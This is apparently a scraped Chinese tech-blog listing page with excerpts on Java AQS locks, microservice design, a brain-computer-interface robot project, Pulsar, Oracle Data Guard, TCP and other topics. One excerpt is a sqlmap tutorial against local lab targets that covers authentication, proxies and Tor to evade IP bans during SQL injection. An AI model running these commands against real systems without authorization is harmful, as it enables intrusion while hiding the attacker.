CLH是一个虚拟的双向链表实现的队列，获取不到锁资源时会被AQS封装成Node节点并加入队列。每个线程执行结束都会唤醒其下一个节点
Synchronizer：同步控制，AQS的同步控制实现有两种。一种是volatile+CAS的乐观锁设计，另一种是LockSupport+CAS的悲观锁设计
切入点 模板方法设计可重入设计CLH队列设计公平/非公平锁设计 模板方法设计 我们来看看AQS的设计流程
从图中可看到，AQS设计并且实现了一个同步器/锁的完整流程；
但是将tryAcquire/tryAcquireShared和tryRelease/tryReleaseShared这些经常改动的操作设置为抽象方法，留给子类自行拓展
acquire方法剖析
这个方法采用门面设计模式，将CAS获取锁，封装线程以及添加CLH队列的操作封装成一个方法并对外提供
我们常用的ReentrantLock.lock方法实际上就是调用此方法
public final void acquire(int arg) { // 尝试通过CAS获取锁，若获取成功则执行同步代码块 // 获取失败则通过addWaiter将当前线程封装成AQS的Node节点并加入CLH队列，同时中断当前线程 if (!tryAcquire(arg) &amp;&amp; acquireQueued(addWaiter(Node.EXCLUSIVE), arg)) selfInterrupt(); } addWaiter方法剖析
Node是AQS的内部类，Node是组成CLH队列的节点
申请公平/非公平锁失败都会被加入CLH队列
private Node addWaiter(Node mode) { // 1. 将当前线程跟Node关联起来，方便AQS根据队列顺序唤醒获取锁 Node node = new Node(Thread.currentThread(), mode); // Try the fast path of enq; backup to full enq on failure Node pred = tail; // 2.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/939e557bd2cddc8a237202b1ce5185fc/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/82020103a5396191f0ce699b0df045d0/" rel="bookmark">
			Sqlmap参数设置
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Sqlmap参数设置 🎈🎈🎈🎈🎈🎈🎈🎈🎈🎈🎈🎈🎈🎈
--------------------------------------------注意-----------------------------------------------
没有授权的渗透测试均属于违法行为，请勿在未授权的情况下使用本文中的攻击手段，建议本地搭建环境进行测试，本文主要用于学习分享，请勿用于商用及违法用途，如果用于非法用途与本文作者无关。
1.设置HTTP协议参数 🍔🍔🍔🍔🍔🍔🍔🍔🍔🍔🌭🌭🌭🌭🌭🍔🍔🌭
Sqlmap中设置HTTP协议认证的参数:--auth-type和--auth-cred
–auth-type：Basic、Digest、NTLM
–auth-cred：username:password
例如：python sqlmap.py -u “” --auth-type Basic --auth-cred “admin:admin”
靶场环境搭建
/home/kali/Desktop/vulnhub/vulhub-master/tomcat/tomcat8
docker-compose up -d 但我们访问以下URL时，就可以看到，如下图所示
http://localhost:8080/
sqlmap -u "localhost:8080/host-manager" --auth-type Basic --auth-cred "tomcat:tomcat"
使用以上的参数有一个前提条件就是必须知道用户名和密码
2.sqlmap设置HTTP代理 🫥🫥🫥🫥🫥😶‍🌫️😶‍🌫️😶‍🌫️😶‍🌫️😎😎😎😎😎😎
Sqlmap中设置代理的参数：--proxy,--proxy-cred,--proxy-file,--ignore-proxy
--proxy用来设置HTTP代理服务器格式：--proxy http(s)://ip[:端口]
--proxy-cred用来设置HTTP代理服务器认证信息 格式:--proxy-cred username:password
--proxy-file 用来设置多条代理在文件中
--ignore-proxy当希望通过忽略系统范围内的HTTP(S)代理服务器设置来针对本地网络的目标部分运行sqlmap时，应该使用这种方法。
本地搭建环境SQLilab然后进行测试，因为这里随便找了的代理地址，故没有成功
python sqlmap.py -u "http://192.168.153.136/sqli-labs-master/Less-1/?id=1" --proxy "http://114.232.110.38:8089" --batch --random-agent
如果是有多个地址的可以将其打包成一个txt文件，使用参数--proxy-file进行批量使用。
3.Sqlmap设置Tor隐藏网络 🥨🥨🥨🥨🥨🥨🍔🍔🍔🍔🌭🌭🌭🌭🌭🍔🍔🍔🍔🌭🌭🎈🎈🎈
Sqlmap中设置Tor网络的参数：--tor，--tor-port，--tor-type，--check-tor
利用tor服务器的ip时刻变换的特性，避免注入时候被目标服务封IP
sqlmap -u IP地址 --tor --check-tor --tor-port=9150 --tor-type=SOCKS5 --time-sec 10
值得注意一点的是kali中可能没有tor，需要下载
1.下载tor代理apt install tor 笑死，才来就报错，没得办法直接升级吧
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/82020103a5396191f0ce699b0df045d0/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/87657210bf29f8698fab06536f1d1ff6/" rel="bookmark">
			【SpringCloud】设计原则之数据一致性与设计模式
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 一、设计原则之数据一致性 数据一致性分以下几种情况。 强一致性 当更新操作完成之后，任何多个后续进程或线程的访问都会返回最新的更新过的值。这种是对用户最友好的，就是用户上一次写什么，下一次就保证能读到什么。根据 CAP 理论，这种实现需要牺牲可用性。
弱一致性 系统并不保证后续进程或线程的访问都护II返回最新的更新过的值。系统在数据写入成功之后，不承诺立即可以读到最新写入的值，也不会具体地承诺多久之后可以读到。
最终一致性 弱一致性的特定形式。系统保证在没有后续更新的前提下，系统最终返回上一次更新操作的值。在没有故障发生的前提下，不一致窗口的时间只要受通信延迟、系统负载和复制副本的个数影响。DNS 是一个典型的最终一致性系统。
在工程实践上，为了保障系统的可用性，系统大多将强一致性需求转换成最终一致性的需求，并通过系统执行幂等性来保证数据的最终一致性。 微服务架构下，完整交易跨越多个系统运行，事务一致性是一个极具挑战的话题。依据 CAP 理论，必须在可用性和一致性之间做出选择。我们认为在微服务架构下应选择可用性，然后保证数据的最终一致性。
在实践中有三种模式： 可靠事件模式 可靠事件模式属于事件驱动架构，当某件重要事情发生时，例如，更新一个业务实体，微服务会向消息代理发布一个事件，消息代理向订阅事件的微服务推送事件，当订阅这些事件的微服务接收此事件时，就可以完成自己的业务，可能会引发更多的事件发布。
业务补偿模式 补偿模式使用一个额外的协调服务来协调各个需要保证一致性的工作服务，协调服务按顺序调用各个工作服务，如果某个工作服务调用失败，则撤销之前所有已经完成的工作服务。要求需要保证一致性的工作服务提供补偿操作。
TCC 模式 一个完整的 TCC 业务由一个主业务服务和若干个从业务服务组成，主业务服务发起并完成整个业务活动，TCC 模式要求从服务提供三个接口 —— Try（负责资源检测）、Confirm（真正执行业务）和 Cancel（释放 Try 阶段预留的资源）。 二、设计原则之设计模式 微服务设计模式主要有以下几种：
链式设计模式 链式设计模式是最常见的一种设计模式，用于微服务之间的调用，应该请求通过网关到达第一个微服务，微服务经过基础业务处理，发现不能满足要求，继续调用第二个服务，然后将多个服务的结果统一返回到请求中，如图所示。
聚合器设计模式 聚合器设计模式是将请求统一由网关路由到聚合器，聚合器向下路由到指定的微服务中获取结果，并且完全聚合，如图所示。首页展示、分类搜索和个人中心等通常都使用这种设计。
数据共享模式 数据共享模式也是微服务设计模式的一种。应用通过网关调用多个服务，微服务之间的数据共享通过同一个数据库，这样能有效的减少请求次数，并且对于某些数据量小的情况非常适用，如图所示。
异步消息设计模式 异步消息设计模式乍看起来跟聚合器设计模式很像，唯一的区别就是网关和微服务之间的通信是通过消息队列而不是聚合器的方式来进行的，采用的是异步交互的方式，如图所示。 参考资料：《微服务架构实战》—— 张锋 一 叶 知 秋，奥 妙 玄 心 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7c5909538596e00388bc6e2176a4aab9/" rel="bookmark">
			脑机接口&#43;机器狗 | MIT的 Ddog 项目将脑机接口与Spot 机器人连接起来
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		未来，将脑机接口(BCI)和机器人系统结合起来，就能在日常生活中实现无缝个人助理系统，只需利用大脑活动，就能以离散的方式执行请求。
这类系统可能有助于锁定综合征（LIS）或肌萎缩性脊髓侧索硬化症（ALS）患者的日常助理，因为他们可以从使用大脑传感接口与机器人助手进行交流中获益。
由Nataliya Kos'myna领导的麻省理工学院研究团队最近发表了一篇有关 Ddog 项目的论文。该项目旨在将波士顿动力公司的 Spot 四足机器人改造成一种基本的通讯工具，供患有渐冻人症、脑瘫和脊髓损伤等肢体障碍的人使用。
该项目的系统使用了包括AttentivU 在内的脑机接口（BCI）系统。这是一副内置传感器的无线眼镜。这些传感器可以测量一个人的脑电图(EEG)或大脑活动，以及眼电图(EEG)或眼球运动。
这项研究是建立在该大学的"Brain Switch"，它是一种实时闭环脑机接口技术，允许用户与看护人进行非语言的实时交流。Kos'myna的Ddog项目使用与Brain Switch相同的技术栈和基础设施扩展了该应用程序。
Spot可以为用户获取物品
许多患有ALS(肌萎缩侧索硬化症)的患者已经或最终将失去行走、穿衣、说话、写字甚至呼吸的能力。虽然交流辅助设备确实存在，但大多数是眼睛注视设备，允许用户使用计算机进行交流。允许用户与周围世界互动的系统并不多。
Ddog最大的优势在于它的移动性。这就意味着，只要给它下达简单的指令，它就能在无人干预的情况下执行。
Spot的移动能力也很强。它的四条腿几乎可以到达人类可以到达的任何地方，包括上下斜坡和楼梯。机器人的手臂配件可以让它执行一些任务，比如递送杂货、搬动椅子，或者把书或玩具拿给用户。
在这项概念验证工作中，研究人员探索了无线可穿戴 BCI 设备如何控制四足机器人--波士顿动力公司的 Spot。该设备通过嵌入眼镜框的电极测量用户的脑电图（EEG）和脑电图（EOG）活动。用户通过进行脑筋急转弯的内心活动来回答一系列“是”或“否”的问题。每个问答对都为Spot预先配置了一组操作。例如，当一连串问题的答案都是"是"时，系统会提示 Spot 穿过房间，拿起一件物品，并为用户取回（例如，拿一瓶水）。该系统成功率高达 83.4%。
参考文献：
https://www.therobotreport.com/ddog-mit-project-connects-brain-computer-interface-spot-robot/
—— End ——
仅用于学术分享，若侵权请留言，即时删侵！
加入社群 欢迎加入脑机接口社区交流群，
探讨脑机接口领域话题，实时跟踪脑机接口前沿。
加微信群：
添加微信:RoseBrain【备注：姓名+行业/专业】。
加QQ群：913607986
欢迎来稿 1.欢迎来稿。投稿请点击 脑机接口社区学术新闻投稿指南
2.加入社区成为兼职创作者，请联系微信：RoseBrain
一键三连「分享」、「点赞」和「在看」
不错每一条脑机前沿进展 ~
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/bb9b8a5f7d96b9a919a03ed14bba75c5/" rel="bookmark">
			pulsar原来是这样操作topic的
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		本篇主要讲述pulsar topic部分，主要从设计以及源码的视角进行讲述。在pulsar中，一个Topic的新建、扩容以及删除操作都是由Broker来处理的，而Topic相关的数据是存储在zookeeper上的。本篇文章模拟一个高效的学习流程进行展开
介绍使用方式(Topic操作指令)从高纬度俯视调用流程(从服务层面看Topic的调用流程)逐步切入某个具体的操作进一步展开内部的调用流程(从代码层面看具体的调用流程)看具体的实现(看代码具体的实现) Topic操作指令 在日常对pulsar Topic操作时，咱们常常会用到以下指令
//1. Topic创建 pulsar-admin topics create-partitioned-topic \ persistent://my-tenant/my-namespace/my-topic \ --partitions 4 //2. Topic扩容 pulsar-admin topics update-partitioned-topic \ persistent://my-tenant/my-namespace/my-topic \ --partitions 8 //3. Topic删除 pulsar-admin topics delete persistent://test-tenant/ns1/tp1 //4. Topic unload pulsar-admin topics unload persistent://test-tenant/ns1/tp1 更多的操作可以参考 https://pulsar.apache.org/docs/3.0.x/admin-api-topics/
在这里列举了针对分区并存储Topic的四个操作指令
Topic创建，通过指令可以在指定的租户以及命名空间下创建Topic并指定分区数Topic扩容，这是业务场景为了提升性能时通常会用到的操作，增加指定Topic的分区数Topic删除，删除不用的Topic，在删之前一定要在监控上确保此Topic的上下游都没有被使用Topic unload，重制Topic状态 以上就是使用方式，打个比方就是猪可以用来烹饪，猪脑可以用来烤脑花等等
服务层面调用流程 Pulsar用户(管理员) 跟Pulsar集群的交互流程可以提炼成上面这张表，从左往右看
用户是集群管理员或者Pulsar的用户，在跟Pulsar集群交互时，可以通过Pulsar提供的上面三种方式。上面提供的操作指令就是第一种shell命令的方式，还可以直接通过http访问rest接口方式以及使用Pulsar针对各个编程语言提供的sdk包进行操作Pulsar集群Topic相关的元数据全部存储在Zookeeper中，同时为了避免高频访问Zookeeper导致的性能瓶颈，Pulsar在自身服务增加了Cache，在本地内存进行元数据的存储。同时在Pulsar Broker启动时会在Zookeeper添加Watcher来感知元数据的变动，如果有变动会同步更新本地Cache。在有Topic元数据相关的查操作时，会优先查询本地CachePulsar Topic里的数据会存在Bookkeeper中，在对Topic新增/删除时，会调用Bookkeeper来创建/删除 Bookkeeper中相关的数据 以上就是高纬度俯视调用流程，打个比方就是猪的骨架以及神经脉络的构成，这个设计/调用流程在大的方向上已经将Pulsar定型了。在学习的过程中切忌一下子就钻入细节(除非是急着解决问题)，一定要有一个清晰的全貌认识，在根据需要逐步切入具体的细节
代码层调用流程 在对全貌有了解后，咱们开始从代码实现层面来看调用流程
首先先看通用的，无论是新增、扩容、卸载还是删除，Pulsar都需要让所有Broker节点感知到元数据的变化。通过下图来看看Pulsar是怎么做的
如上图所示，Pulsar Broker在启动的时候，会通过ZooKeeperCache对象的构造函数中创建一个ZookeeperClient对象，其通过watcher方式来监听 Zookeeper中 /brokers/topics 路径下数据的变动；在Topic新建时，本质上就是在 /brokers/topics目录下新建一个 Topic名称的子目录，Topic删除本质就是删除此目录，而扩容的本质就是变更 /brokers/topics/topic名称 中分区的信息。因此Pulsar中Topic的变更感知其实就是通过Zookeeper提供的一致性写入以及watcher来实现的，这也是大部分组件元数据变更的实现方案。通过上述可以看到Pulsar在感知到Topic元数据的变动后只做了一件事，就是同步刷新本地的缓存。
在知道Pulsar是怎么实现的Topic变更感知后，接下来看看它的Topic新建流程
如上图所示，在我们通过指令调用Pulsar创建Topic后，Pulsar Broker会调用ZKMetadataStore的put方法进行处理，其内部罪关键的操作就是调用Zookeeper的客户端在 Zookeeper的服务端 /brokers/topics目录下创建Topic名称的新目录，同时更新本地缓存AsyncLoadingCache。至此Topic创建的流程就结束了，可以负责消息的读写操作。其他扩容、删除等操作也类似，在这里就不一一例举了。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/bb9b8a5f7d96b9a919a03ed14bba75c5/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/aa89b772c351cdcae46cc9c7e2506a0b/" rel="bookmark">
			基于视觉的无人机自主降落系统设计
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 摘 要第一章 绪论1.1 课题开发背景1.1.1 课题的意义1.1.2 国内外发展状况 1.2 课题研究内容1.3 课题研究步骤1.4 本章小节 第二章 MatlabGUI的搭建2.1 下载安装Matlab2.2 在Matlab中搭建GUI平台2.2.1 GUI介绍2.2.2 GUI的组成2.2.3 GUI搭建步骤2.2.4 GUI的使用 2.3 matlab坐标轴绘制2.4 本章小节 第三章 图像识别算法介绍3.1 二值化 3.2 直方图均衡化3.3 knn算法分析3.3.1 knn简介3.3.2 knn的优缺点 3.4 自主降落系统设计3.4.1 单目地标识别算法-点特征定位3.4.2 双目降落区域选择 3.5 matlab路径规划仿真验证3.6 本章小节 第四章 无人机自主降落环境识别算法4.1 算法流程图4.2 具体步骤4.3 系统流程 第五章 无人机自主降落的环境测试5.1 测试的意义和方法5.2 系统的配置5.3 程序分析5.3 本章小节 第六章 总结与展望 摘 要 无人机的自主化降落过程里，从传统的地标识别法里面可以看到，实验需要大量的实验测试。为了解决这一问题，提出了一种基于仿射不变矩和支持向量机的方法。第一，六个以某个半径画圆将其组合为整体图标，可以被认为是无人机自主降落的地面标识。这是因为无人机自主降落时选择目标图像的特征，它提取与输入具有主要特征类似的地面图像的相关不变矩。支持向量机用于识别前一周期的像素对应点。该方法有效地提高了识别的准确率，减少了识别和测试的时间，对地标的识别有很好的效果。
对于无人机能否在某个区域内进行自主降落的问题，提出了一些关于无人机自主降落控制系统的相关系统结构。提出两种结构，分别是横向控制回路和纵向控制回路。提出了一种很有效的关于飞行距离的降落地面方针，将着降落轨道分为了四中不同的阶段：进入飞行段和直线滑道。指数平滑段和跑道滑道段。计算出了各种飞行阶段的纵向轨道公式。在Matlab环境下对无人机着陆阶段的低速仿真结果表明，无人机着陆轨道和设计着陆轨迹控制方法有效地实现了无人机的安全着陆。无人机的稳定降落，这完全能够符合预定标准的硬性要求。
关键字：无人机、自主降落、着陆轨迹、地标设计、matlab
DESIGN OF AUTONOMOUS LANDING SYSTEM FOR UAV BASED ON VISION
ABSTRACT
In the autonomous landing process of UAVs, we can see from the traditional landmark recognition method that the experiment needs a lot of experimental tests.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/aa89b772c351cdcae46cc9c7e2506a0b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9c847a986ea72ac614b1ed992490447a/" rel="bookmark">
			【Proteus仿真】【Arduino单片机】水箱液位监控系统
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 一、功能简介二、软件设计三、实验现象联系作者 一、功能简介 本项目使用Proteus8仿真Arduino单片机控制器，使用LCD1602液晶、按键、蜂鸣器、液位传感器、ADC转换器、水泵等。
主要功能：
系统运行后，LCD1602显示当前水位、上下限阈值和工作模式，系统默认处于自动模式。
若检测水位高于上限，声光报警，开启抽水。若检测水位低于下限，声光报警，开启加水。
可操作K4键切换为手动模式，然后通过K1/K2键开启加水和开启抽水。再次按下K4键回到自动模式。
若要修改上下限阈值，可通过K3键进入上下限设置，光标定位修改的值，K1和K2进行加减。
还可通过串口助手进行参数修改和模式切换，指令(十六进制)如下：
加–&gt;01
减–&gt;02
模式–&gt;03
确定/自手动–&gt;04
二、软件设计 /* 作者：嗨小易（QQ技术交流群：570487280） */ //系统数据获取 void sys_data_get(void) { u8 ad_value=0; float vol=0; while(1) { //读取压力AD值 ad_value=pcf8591_read_adcvalue(0); //计算电压 vol=(float)ad_value*5.0/256; //计算液位高度VO=K*H+∮=0.038*H+1.105(V)	//H单位cm sys_ctrl.level=(vol-1.105)/0.038; if(sys_ctrl.level&lt;=0)sys_ctrl.level=0; break; } } //系统数据显示 void sys_data_show(void) { while(1) { //显示当前液位 lcd1602_show_nums(5,0,sys_ctrl.level,3,0); //液位阈值显示 lcd1602_show_nums(2,1,sys_ctrl.levell,3,0); lcd1602_show_nums(11,1,sys_ctrl.levelh,3,0); //自动手动模式显示 if(sys_ctrl.auto_flag==1)lcd1602_show_string(12,0,"Manl"); else lcd1602_show_string(12,0,"Auto"); //阈值设置位置闪烁 switch(sys_ctrl.mode) { case 1://液位下限 lcd1602_show_string(2,1," "); delay_ms(100); lcd1602_show_nums(2,1,sys_ctrl.levell,3,0); break; case 2://液位上限 lcd1602_show_string(11,1," "); delay_ms(100); lcd1602_show_nums(11,1,sys_ctrl.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9c847a986ea72ac614b1ed992490447a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7ebe2a4f8f4bcb74b3c5efa05fb79b9f/" rel="bookmark">
			oracle DG broken工具配置
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1)broken配置
可以在主库/备库/额外一台上配置
修改监听：
vi $ORACLE_HOME/network/admin/listener.ora
主库（新增如下代码）：
SID_LIST_LISTENER =
(SID_LIST =
(SID_DESC =
(GLOBAL_DBNAME= orcl)
(ORACLE_HOME =/oracle/app/product/11.2.0/db_1)
(SID_NAME =orcl)
)
(SID_DESC =
(GLOBAL_DBNAME=orcl_DGMGRL)
(ORACLE_HOME =/oracle/app/product/11.2.0/db_1)
(SID_NAME =orcl)
)
)
备库（新增）：
SID_LIST_LISTENER =
(SID_LIST =
(SID_DESC =
(GLOBAL_DBNAME= orcl_std)
(ORACLE_HOME =/oracle/app/product/11.2.0/db_1)
(SID_NAME =orcl)
)
(SID_DESC =
(GLOBAL_DBNAME=orcl_std_DGMGRL)
(ORACLE_HOME =/oracle/app/product/11.2.0/db_1)
(SID_NAME =orcl)
)
)
重启监听
lsnrctl reload
用tnsping进行检验是否配置正确。
2）参数设置(主备都要)
SQL&gt; show parameter dg_broker_start
NAME TYPE VALUE
------------------------------------ ----------- ------------------------------
dg_broker_start boolean FALSE
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7ebe2a4f8f4bcb74b3c5efa05fb79b9f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7dddfe0cf227c3b2d3fafe4e84b4d15e/" rel="bookmark">
			理解机器学习中的术语
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 标量 向量 矩阵 张量求导，梯度代码实现pytorch实现 标量 向量 矩阵 张量 标量(scalar)，也可以叫做常量，例如 x = 5向量(vector), 它是一个一维数组，例如 x = [1,3,4]矩阵(matrix), 它是一个二维数组，例如 1 2 3 4 5 6 7 8 9 张量(tensor)是一个多维数组，张量涵盖向量，矩阵，3D空间(例如正方体)， 4维等等 标量是张量的最小组成，类似于一个点向量是一个 1阶张量, 是一条线矩阵是一个 2阶张量, 是一个平面依次类推 故而张量是机器学习的基础数据存储单位 求导，梯度 高等数学中一个函数 y = f ( x ) y = f(x) y=f(x)假设这个函数表示求出速度 ， y ( 速度 k m / h ) = 1000 ( m ) x ( 小时 h ) y(速度km/h) = \frac{1000(m)}{x(小时 h)} y(速度km/h)=x(小时h)1000(m)​那么这里的求导就是一个求出加速度 p p p p = f ′ ( x ) = ( 1000 x ) ′ = − 1000 x 2 p = f^{'}(x) = (\frac{1000}{x})^{'} = -\frac{1000}{x^2} p=f′(x)=(x1000​)′=−x21000​这里的求导直接使用了 牛顿莱布尼茨公式而代码的办法是逼近求导 代码实现 设 y = f ( x ) y = f(x) y=f(x)根据最基础的求导理解，逼近 p = lim ⁡ n − &gt; 0 f ( x + n ) − f ( x ) n p = \lim_{n-&gt;0}\frac{f(x+n)-f(x)}{n} p=limn−&gt;0​nf(x+n)−f(x)​那么求导代码如下 def func(x): return 1000 / x # 求导数 def get_p(x, batch=5, init=0.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7dddfe0cf227c3b2d3fafe4e84b4d15e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ac163fb8583cff14472ef6232fa6ce4e/" rel="bookmark">
			oracle增量恢复解决备库GAP问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Rolling forward a standby database using RMAN Incremental Backup.
模拟归档丢失的情况
一 主库操作：
查看当前归档
停用归档传输
alter system set log_archive_dest_state_2=defer;
切换归档
alter system switch logfile;
alter system switch logfile;
模拟丢失归档
RMAN&gt; delete archivelog low sequence 3821 high sequence 3823;
RMAN&gt; delete force archivelog low sequence 3821 high sequence 3823; ------11G需要添加force
恢复归档传输
alter system set log_archive_dest_state_2=enable;
备库警告日志错误
FAL[client]: Failed to request gap sequence
GAP - thread 1 sequence 79-81
DBID 2144245355 branch 846098926
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ac163fb8583cff14472ef6232fa6ce4e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a6c22bac93082b8a609db3fe7450fc5b/" rel="bookmark">
			详解TCP报文格式以及TCP相关特性
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		✏️✏️✏️今天给大家分享的是TCP报文格式的解释以及TCP协议的一些重要特性。
清风的CSDN博客
🛩️🛩️🛩️希望我的文章能对你有所帮助，有不足的地方还请各位看官多多指教，大家一起学习交流！
✈️✈️✈️动动你们发财的小手，点点关注点点赞！在此谢过啦！哈哈哈！😛😛😛
目录
一、 TCP协议段格式
1.1 TCP协议格式 二、TCP原理 (基本机制/特性)
2.1 确认应答机制 2.2 超时重传机制 (安全机制)
2.3 连接管理机制（安全机制） 2.4 滑动窗口(效率机制) 2.5 流量控制(安全机制) 2.6 拥塞控制(安全机制)
2.7 延时应答(效率机制)
2.8 捎带应答(效率机制) 三、粘包问题 四、TCP异常情况 五、TCP小结
TCP是传输层的重点协议，对于我们了解网络原理有着至关重要的作用。 一、 TCP协议段格式 TCP 协议 TCP ，即 Transmission Control Protocol ，传输控制协议。人如其名，要对数据的传输进行一个详细的控制。 1.1 TCP协议格式 源/目的端口号：表示数据是从哪个进程来，到哪个进程去32位序号/32位确认号：后面详细给大家介绍4位首部长度：表示该TCP头部有多少个32位bit（有多少个4字节）,所以TCP头部最大长度是 15 * 4 = 60 6位标志位: URG：紧急指针是否有效 ACK：确认号是否有效 PSH：提示接收端应用程序立刻从TCP缓冲区把数据读走 RST：对方要求重新建立连接；我们把携带RST标识的称为复位报文段 SYN：请求建立连接；我们把携带SYN标识的称为同步报文段FIN：通知对方，本端要关闭了，我们称携带FIN标识的为结束报文段 16位窗口大小：流量控制(下面我会详细介绍)16位校验和：发送端填充，CRC校验。接收端校验不通过，则认为数据有问题。此处的检验和不光包含TCP首部，也包含TCP数据部分16位紧急指针：标识哪部分数据是紧急数据40字节头部选项：暂时忽略 二、TCP原理 (基本机制/特性) TCP 对数据传输提供的管控机制，主要体现在两个方面：安全和效率。这些机制和多线程的设计原则类似：保证数据传输安全的前提下，尽可能的提高传输效率。 2.1 确认应答机制 TCP将每个字节的数据都进行了编号，即为序列号，但是并不会真正的存储每个字节的序列号，只需要保存起始序号，通过TCP的报文长度来＋ 起始序号得到最后一个字节的编号。
每一个 ACK 都带有对应的确认序列号，意思是告诉发送者，我已经收到了哪些数据，下一次你从哪里开始发。 2.2 超时重传机制 (安全机制) 主机A发送数据给B之后，可能因为网络拥堵等原因，数据无法到达主机B如果主机A在一个特定时间间隔内没有收到B发来的确认应答，就会进行重发 但是，主机 A 未收到 B 发来的确认应答，也可能是因为 ACK 丢失了: 此时也会触发主机A重发， 因此主机 B 会收到很多重复数据。那么 TCP 协议需要能够识别出那些包是重复的包，并且把重复的丢弃 掉。 这时候我们可以利用前面提到的序列号，就可以很容易做到去重的效果。 那么，如果超时，这个时间如何确定？ 最理想的情况下，找到一个最小的时间，保证 "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a6c22bac93082b8a609db3fe7450fc5b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ba4f5d499ac815fca94420148057d9d5/" rel="bookmark">
			C&#43;&#43;完成使用map Update数据 二进制数据
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、在LXMysql.h和LXMysql.cpp分别定义和编写关于pin语句的代码 //获取更新数据的sql语句 where语句中用户要包含where 更新 std::string GetUpdatesql(XDATA kv, std::string table, std::string where); std::string LXMysql::GetUpdatesql(XDATA kv, std::string table, std::string where) { string sql = ""; if (kv.empty() || table.empty()) { return ""; } //update t_vedio set name= 'update001', size=1000 where id =10; sql = "update `"; sql += table; sql += "` set "; for (auto ptr = kv.begin(); ptr != kv.end();ptr++) { sql += "`"; sql += ptr-&gt;first; sql += "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ba4f5d499ac815fca94420148057d9d5/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a2c7320b2c24d814afa0730ba6a0d375/" rel="bookmark">
			Spring框架搭建
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		使用普通的java工程或者web工程，需要下载Spring的相关jar包。
使用maven搭建，省去了下载jar包这一步。下面就使用maven来搭建一个Spring项目。
一、demo
1、demo1：
（1）pom添加相关依赖：
&lt;project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd"&gt; &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt; &lt;groupId&gt;com.demo&lt;/groupId&gt; &lt;artifactId&gt;mavenspring&lt;/artifactId&gt; &lt;version&gt;0.0.1-SNAPSHOT&lt;/version&gt; &lt;dependencies&gt; &lt;!-- Spring依赖 --&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework&lt;/groupId&gt; &lt;artifactId&gt;spring-core&lt;/artifactId&gt; &lt;version&gt;4.3.13.RELEASE&lt;/version&gt; &lt;!-- &lt;exclusions&gt; &lt;exclusion&gt; &lt;groupId&gt;commons-logging&lt;/groupId&gt; &lt;artifactId&gt;commons-logging&lt;/artifactId&gt; &lt;/exclusion&gt; &lt;/exclusions&gt; --&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework&lt;/groupId&gt; &lt;artifactId&gt;spring-context&lt;/artifactId&gt; &lt;version&gt;4.3.13.RELEASE&lt;/version&gt; &lt;scope&gt;runtime&lt;/scope&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;log4j&lt;/groupId&gt; &lt;artifactId&gt;log4j&lt;/artifactId&gt; &lt;version&gt;1.2.17&lt;/version&gt; &lt;/dependency&gt; &lt;/dependencies&gt; &lt;/project&gt; （2）在resources资源文件夹下创建两个文件：
log4j.properties为日志文件：
